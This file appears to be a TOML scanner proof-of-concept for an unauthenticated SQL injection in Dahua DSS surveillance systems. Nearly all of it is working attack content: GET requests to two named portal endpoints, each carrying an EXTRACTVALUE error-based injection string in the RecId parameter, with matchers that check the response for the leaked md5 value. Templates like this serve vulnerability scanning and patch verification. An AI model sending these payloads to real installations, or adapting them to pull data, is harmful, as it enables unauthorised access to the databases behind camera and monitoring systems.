[info]
id = "POC-AVE-2026-0027"
name = "大华 DSS 数字监控系统 SQL 注入 PoC"
author = "AVE"
severity = "high"
tags = ["sqli", "dahua", "cnvd-2017-06001", "cwe-89"]
description = "大华 DSS 数字监控系统 /portal/attachment_clearTempFile.action 和 /portal/attachment_getAttList.action 接口存在 SQL 注入漏洞，未经身份验证的攻击者可利用 EXTRACTVALUE 函数进行错误注入获取数据库信息。"
vuln_id = ["CNVD-2017-06001", "AVE-2026-0027"]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/portal/attachment_clearTempFile.action"

query.bean.RecId = "1') AND EXTRACTVALUE(534543,CONCAT(0x5c,md5(999999999),0x5c)) AND ('n72Yk'='n72Yk"
query.bean.TabName = "1"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["XPATH syntax error:", "c8c605999f3d8352d7bb792cf3fdb25"]
expect = true

[[poc.requests]]
method = "GET"
path = "/portal/attachment_getAttList.action"

query.bean.RecId = "1') AND EXTRACTVALUE(534543,CONCAT(0x5c,md5(999999999),0x5c)) AND ('n72Yk'='n72Yk"
query.bean.TabName = "1"

[[poc.requests.matchers]]
type = "status"
status = [200]
expect = true

[[poc.requests.matchers]]
type = "word"
part = "body"
words = ["XPATH syntax error:", "c8c605999f3d8352d7bb792cf3fdb25"]
expect = true
